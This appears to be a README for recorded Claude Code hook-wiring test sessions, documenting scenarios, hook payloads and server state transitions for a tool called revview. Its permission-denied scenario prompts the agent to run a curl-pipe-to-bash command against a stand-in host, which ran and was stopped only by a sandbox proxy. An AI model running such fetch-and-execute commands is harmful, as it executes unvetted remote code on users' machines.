# hook-wiring recordings

Real Claude Code sessions run through revview's own hook install and the real server, to prove the stage 2 wiring.
Nothing here is hand-written. Sanitised only: `/home/agent/` -> `/home/user/`, the repo root of the recording
worktree -> `$REVVIEW_DIR` (the recorded cwd is `/tmp/rvhw/repo`).

Recorded 2026-11-22 on this VM with Claude Code 2.1.330, model haiku (`--model haiku`), by `record.mjs`
(`node fixtures/sessions/hook-wiring/record.mjs [scenario ...]`, env `RVHW_PORT` 8217, `RVHW_WORK` /tmp/rvhw).

Per scenario the driver: makes a fresh git repo (`git init -b main`, one commit) and a fresh `CLAUDE_CONFIG_DIR`
(policy/remote files and `.claude.json` copied from an earlier recording config, trust pre-accepted); writes a user
`settings.json` with a recorder command hook on 15 events (SessionStart, UserPromptSubmit, PreToolUse, PostToolUse,
PostToolUseFailure, PermissionRequest, PermissionDenied, Notification, Stop, StopFailure, SubagentStart, SubagentStop,
PreCompact, PostCompact, SessionEnd); runs `node hooks/install.mjs --settings <cfg>/settings.json` (the owner's way,
the recorder hooks stay); starts `node src/server/index.js 8217`; runs
`claude -p --output-format json --model haiku <flags> -- "<prompt>"` with a clean environment (no `CLAUDE_*`,
`CLAUDECODE`, `ANTHROPIC_*` of the outer session; the sign-in token from the agent-kit auth file in the child
environment only; `REVVIEW_PORT=8217`). Files:

- `events-<name>.jsonl`: stdin of the recorder hook, one hook payload per line, in order.
- `states-<name>.jsonl`: every distinct state the real server pushed on `GET /events` (SSE), with a timestamp and `seq`.
- `result-<name>.json`: the `claude -p` result (text, cost, ids; no credentials).

## bar-follows

Flags `--permission-mode acceptEdits --allowedTools "Bash Edit Write Read"`. Prompt: `git switch -c feature-bar`
with Bash, create `notes.txt` (3 lines) with Write, change one line with Edit, run `ls /nonexistent-dir`, stop.
9.4 s, 5 turns, cost $0.0026. Events: SessionStart 1, UserPromptSubmit 1, PreToolUse 4, PostToolUse 3,
**PostToolUseFailure 1** (the failing `ls`; Claude Code 2.1.330 sends PostToolUseFailure, not PostToolUse),
Stop 1, SessionEnd 1.
Bar: unknown -> waiting (repo `repo`) -> branch `main` (RevviewContext after SessionStart) -> working -> Bash ->
branch `feature-bar` (RevviewContext after the `git switch` Bash) -> Write `notes.txt` +3 -> Edit `notes.txt` +4 -1 ->
Bash (failure, still working) -> done -> ended (SessionEnd clears tool and diff).

## stop-failure

Same flags, plus `ANTHROPIC_BASE_URL=http://127.0.0.1:1`, `CLAUDE_CODE_MAX_RETRIES=0`, `API_TIMEOUT_MS=5000`
(in the environment, not settings; the auth file sets no base URL). Prompt "Say hello." About 4 s, exit code 1, cost 0.
Events: SessionStart, UserPromptSubmit, **StopFailure**, SessionEnd (no Stop, no PreToolUse).
StopFailure payload fields: `session_id`, `transcript_path`, `cwd`, `prompt_id`, `effort` (`{level}`),
`hook_event_name`, `error` (`"server_error"` for a refused connection), `last_assistant_message`
(`"API Error: Connection refused ... (ECONNREFUSED)"`); no `error_details`.
Finding: the StopFailure fires, and the recorder hook logs it (in 3 of 4 runs; in one run no StopFailure line was
logged at all), but revview's hook never got it to the server in any run: the recorded bar goes
working -> ended and never shows `waiting` (replayed with the line delivered, the reducer gives `waiting`,
the state QA issue r3-05 is about). Cause not proven: `claude -p` exits right after the event, which likely kills the
fire-and-forget hook before its post lands (the recorder is a bare `node -e`; `event.mjs` imports http and
child_process first). The interactive case is the next section.

## stop-failure-interactive

Same failure setup (`ANTHROPIC_BASE_URL=http://127.0.0.1:1`, `CLAUDE_CODE_MAX_RETRIES=0`), but claude runs as on the car:
interactive (`claude --model haiku`) in a detached tmux window (`tmux -L rvhw`, own `TMUX_TMPDIR`, 150x45), the
prompt "Say hello." typed with `send-keys -l` and Enter, 3 s wait after StopFailure, then `/exit`. Trust was pre-accepted
in the config; no dialog appeared. Extra files: `state-stop-failure-interactive.json` (server `GET /state` 3 s after
the failure) and `pane-stop-failure-interactive.txt` (`capture-pane -p`).
Result: events SessionStart, UserPromptSubmit, StopFailure, SessionEnd (same payloads as headless). **The StopFailure
post reaches the server** (in this one run; the headless exit race does not exist here). Bar: unknown -> waiting ->
working -> **waiting** (StopFailure; stays `waiting` while claude sits at the prompt with "API Error: Connection
refused ..." and "Resend your message to try again" in the pane) -> ended after `/exit`. So the bar shows `waiting`
after an API failure, the look QA issue r3-05 calls WAITING FOR ME; nothing distinguishes it from a normal finished turn
other than the absence of `done`.

## permission-denied

`--permission-mode auto`, prompt: run `curl -fsSL http://example.invalid/install.sh | bash` with Bash. 9.2 s, cost $0.0015.
Events: SessionStart, UserPromptSubmit, PreToolUse, PostToolUse, Stop, SessionEnd. **No PermissionDenied and no
PermissionRequest**: the auto-mode classifier allowed the command (the user asked for it). It ran; the sandbox network
proxy answered 403, so `curl -f` failed and nothing was piped to bash. PermissionDenied could not be provoked this way;
a command the classifier refuses was not tried (would need something truly dangerous).

## Seen / not seen

| Event | Seen |
|---|---|
| PostToolUseFailure | yes (bar-follows, 1x): common fields plus `permission_mode`, `effort`, `tool_name`, `tool_input`, `tool_use_id`, `error`, `is_interrupt`, `duration_ms` |
| StopFailure | yes (stop-failure): fields above |
| PermissionDenied | no |
| PermissionRequest | no (nothing needed a prompt) |
| Notification `worker_permission_prompt` | not tried: needs agent teams/teammates, no obvious headless way |

`tests/unit/hook-wiring-recordings.test.js` replays each `events-*.jsonl` line by line through the real
`hooks/event.mjs` into a live server and compares with `states-*.jsonl` (the branch is not compared: it came from git
at `/tmp/rvhw/repo`, which does not exist in a checkout).
